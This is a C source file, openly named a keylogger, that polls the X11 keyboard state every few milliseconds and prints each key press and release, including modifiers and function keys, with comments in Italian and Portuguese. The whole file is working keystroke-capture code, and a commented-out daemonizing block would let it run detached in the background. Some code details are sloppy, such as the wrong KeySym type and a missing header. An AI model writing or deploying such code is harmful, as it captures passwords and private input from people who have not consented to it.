/* Compilare con:
 * gcc keys.c -lX11 -o keylogger
 * author: https://gist.github.com/frasten/
 */

#include <X11/Xlib.h>
#include <unistd.h>
#include <stdio.h>
#include <signal.h>
#include <X11/keysym.h>

Display *display;

int die;

int fooling(unsigned char c) {
  switch(c) {
    case 1: return 0;
    case 2: return 1;
    case 4: return 2;
    case 8: return 3;
    case 16: return 4;
    case 32: return 5;
    case 64: return 6;
    case 128: return 7;
  }
}

void restore(int s) {
  die=1;
}

int main(int argc, char* argv) {
  unsigned char ok[32];
  unsigned char nk[32];
  int i;
  unsigned int keycode;

  //daemonizing it
  /*if (fork() < 0) {
    return -1;
  }
  if (setsid() < 0) {
    return -1;
  }*/

  //Handle nice closing
  die=0;

  // handlers functions
  signal(SIGTERM, restore);
  signal(SIGQUIT, restore);
  signal(SIGINT, restore);

  // criando display para se comunicar com a maquina. Null = local (mais ou menos)
  display = XOpenDisplay(NULL);
  if(display==NULL) {
    return -1;
  }

  // funcao que retorna um bit que representa uma key do teclado que foi pressionada no display
  XQueryKeymap(display, ok);

  // variavel de controle que eh alterada quando eh chamado alguma handler
  while(!die) {

    fflush(stdout);

    // Ao contrario do sleep(segundos) o usleep trabalha com microsegundos.
    // nao deixar cpu chegar a 100% de load
    usleep(5000);

    // pega todas as keys que são pressionadas
    XQueryKeymap(display, nk);

    /*
     * quantidade de bits passado pela XQueryKeymap. Sempre 32bits
     * passa por todos os membros do keymap
     */
    for(i=0;i<32;i++) {
      /* remove repeticao */
      if(nk[i] != ok[i]) {
        /*
         * Basicamente ele entra aqui quando detecta que uma teclas foi realmente pressionada
         * ou seja, aqui ele elimina a repetição do processo causada pelo while infinito
         * caindo aqui quando algo realmente é pressionado
         */
        // printf("#%d %c %c \n",i , nk[i],ok[i]);
        if(nk[i] != 0) {
          // printf("#%d %c \n",i , nk[i]);
          // printf("code: %f\n", nk[i] ^ ok[i]);
          // printf("%d - ", nk[i] ^ ok[i]);
          // printf("%c - ", nk[i] ^ ok[i]);
          // printf("%c - ", fooling(nk[i] ^ ok[i]));
          // printf("%c \n", i*8+fooling(nk[i] ^ ok[i]));

          /* nao consegui entender ainda, mas nao funciona sem essa funcao e multiplicacao */
          // keycode = int
          keycode= i * 8 + fooling(nk[i] ^ ok[i]);

          // retorna o simbolo da key pressionada
          // ks = KeySym
          char ks = XKeycodeToKeysym(display, keycode, 0);

          // transforma a key em string.
          // precisa ser parametro KeySym
          char *keyname = XKeysymToString(ks);

          if(!keyname) {
            keyname="";
            if(keycode==50 || keycode==62) {
              keyname="shift down";
            } else if(keycode==37 || keycode==105) {
              keyname="ctrl down";
            } else if(keycode==133) {
              keyname="win down";
            } else if(keycode==108) {
              keyname="alt gr down";
            } else if(keycode==64) {
              keyname="alt down";
            } else if(keycode==34) {
              keyname="Ã¥";
            } else if(keycode==48) {
              keyname="Ã¤";
            } else if(keycode==47) {
              keyname="Ã¶";
            } else if(keycode==22) {
              keyname="backspace";
            } else if(keycode==66) {
              keyname="caps lock";
            } else if(keycode==23) {
              keyname="tab";
            } else if(keycode==67) {
              keyname="F1";
            } else if(keycode==68) {
              keyname="F2";
            } else if(keycode==69) {
              keyname="F3";
            } else if(keycode==70) {
              keyname="F4";
            } else if(keycode==71) {
              keyname="F5";
            } else if(keycode==72) {
              keyname="F6";
            } else if(keycode==73) {
              keyname="F7";
            } else if(keycode==74) {
              keyname="F8";
            } else if(keycode==75) {
              keyname="F9";
            } else if(keycode==76) {
              keyname="F10";
            } else if(keycode==95) {
              keyname="F11";
            } else if(keycode==96) {
              keyname="F12";
            } else if(keycode==9) {
              keyname="escape";
	        } else if(keycode==36|| keycode==104) {
              keyname="return";
            }
            if(strcmp("",keyname)==0) {
              printf("[unknown: %u]",keycode);
            } else {
              printf("[%s]",keyname);
            }
          } else {
            if(strcmp(keyname,"Q")==0) {
              keyname="left key";
            } else if(strcmp(keyname,"S")==0){
              keyname="right key";
            } else if(strcmp(keyname,"R")==0){
              keyname="up key";
            } else if(strcmp(keyname,"T")==0){
              keyname="down key";
            }
            printf("[%s]",keyname);
          }
        } else {
            keycode=i*8+fooling(nk[i] ^ ok[i]);
            if(keycode==50 || keycode==62) {
              printf("[shift up]");
            } else if(keycode==37 || keycode==105) {
              printf("[ctrl up]");
            } else if(keycode==133) {
              printf("[win up]");
            } else if(keycode==108) {
              printf("[alt gr up]");
            } else if(keycode==64) {
              printf("[alt up]");
            }
        }
        ok[i]=nk[i];
      }
    }
  }
  XCloseDisplay(display);
  return 0;
}
